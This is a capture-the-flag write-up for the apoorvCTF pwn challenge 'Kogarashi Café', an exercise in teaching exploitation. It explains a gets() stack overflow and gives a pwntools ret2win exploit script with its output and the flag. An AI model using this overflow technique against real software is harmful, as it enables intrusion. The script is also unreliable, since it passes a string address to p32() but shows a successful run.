---
date: 2025-03-07 14:20:45 +02:00
categories: [apoorvCTF, Pwn]
tags: [Pwn, CTF, apoorvCTF]
---

This is a writeup of the Pwn challenge Kogarashi Café - The First Visit by [apoorvCTF](https://apoorvctf.iiitkottayam.ac.in/) 
#### Points: 50
# Premise
A quiet café, a simple question. The barista waits, but your order may mean more than it seems.

`nc chals1.apoorvctf.xyz 3001`
## Challenge files:

[first_visit](https://github.com/CSYClubIIITK/CTF-Writeups/blob/main/ApoorvCTF-25-Writeups/BinExp/Kogarashi%20Caf%C3%A9%20-%20The%20First%20Visit/files/first_visit)

# Observations
Looking at the challenge file, we have a single executable, we can check it with a few methods such as file and checksec

![file](/assets/images/apoorvCTF/cafe1/file.png)

![checksec](/assets/images/apoorvCTF/cafe1/checksec.png)

From this, we see that the file we're working with is a 32 bit executable with some settings that make our lives as attackers easier, such as the binary not being stripped, and PIE not being enabled.

Our next step here is to see if we can check what language the program was compiled in, in my case, I do this by using [Detect it Easy (DIE)](https://github.com/horsicq/Detect-It-Easy)

![DIE](/assets/images/apoorvCTF/cafe1/DIE.png)

As we can see, the program looks like it was made in C/C++. Our next step from here is to load the program into a disassembler, in my case I'm using [IDA Free](https://hex-rays.com/ida-free)

At first upon opening the program, we see the following functions that look interesting
![IDA functions](/assets/images/apoorvCTF/cafe1/IDA_1.png)

We can start off by checking main()
![main functions](/assets/images/apoorvCTF/cafe1/IDA_main.png)

As we can see, theres only a call to order_coffee in it, so we proceed to there
![order_coffee function](/assets/images/apoorvCTF/cafe1/IDA_order_coffee.png)

This function has an interesting component, `gets()`, which is known to be vulnerable, since it doesnt account for the number of characters read by it. We also see the buffer labled as v1 here having a size of 40 characters. These two will be important later.

We have the final function that we want to examine, brew_coffee, we dont see any calls to this function from the normal execution flow of the program, but we can check it anyway:
![brew_coffee function](/assets/images/apoorvCTF/cafe1/IDA_brew_coffee.png)

As is very apparent, brew_coffee is of great interest to us, since it reads and prints the flag. However, as previously stated, we see no calls to this function, but we can exploit the `gets()` call from the previous function.

First though, we want to actually know where we're going, so we want to have the address of brew_coffee. We can find this either by using tools such as gdb or objdump.
Using `objdump -d first_visit` we get a lot of output, but for our purposes we mainly want to focus on the first bits of brew_coffee:
```bash
 0804856b <brew_coffee>:
 804856b:	55                   	push   %ebp
 804856c:	89 e5                	mov    %esp,%ebp
 804856e:	81 ec 98 00 00 00    	sub    $0x98,%esp
 8048574:	83 ec 08             	sub    $0x8,%esp
 8048577:	68 00 87 04 08       	push   $0x8048700
 804857c:	68 02 87 04 08       	push   $0x8048702
 8048581:	e8 ca fe ff ff       	call   8048450 <fopen@plt>
```
Here, we've found our sought address, `0x804856b`, if we can override the buffer and EBP, we can add this at the end as our new return address.

# Solution
With all of our findings, I've developed the following python script, using [pwntools](https://github.com/Gallopsled/pwntools)

```python
from pwn import *

#Exploit target
target = remote('chals1.apoorvctf.xyz', 3001)

#We know we're waiting for exactly two lines of dialogue, once we recieve these, we can send the payload
print(target.recvline())
print(target.recvline())

offset = 44
#Address of brew_coffee() function: 0x0804856b
win_address = "0x0804856b"

payload = b"A"*offset
payload += p32(win_address)

target.sendline(payload)
target.interactive()
```

Running this script gives us the following output:
```bash
b'Welcome to Kogarashi Caf\xc3\xa9.\n'
b"Barista: 'What will you have?'\n"
[*] Switching to interactive mode
Barista: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk\x85\x04\x08... interesting choice.'
Brewing...
Barista: 'A rare choice... here is your secret blend.'
apoorvctf{c0ffee_buff3r_sp1ll}

[*] Got EOF while reading in interactive
$
```

Which gives us the flag:
> apoorvctf{c0ffee_buff3r_sp1ll}
{: .prompt-tip }


# Tools and sources used:
- [IDA Free](https://hex-rays.com/ida-free)
- [pwntools](https://github.com/Gallopsled/pwntools)
- [Detect It Easy](https://github.com/horsicq/Detect-It-Easy)
- [checksec](https://github.com/slimm609/checksec)
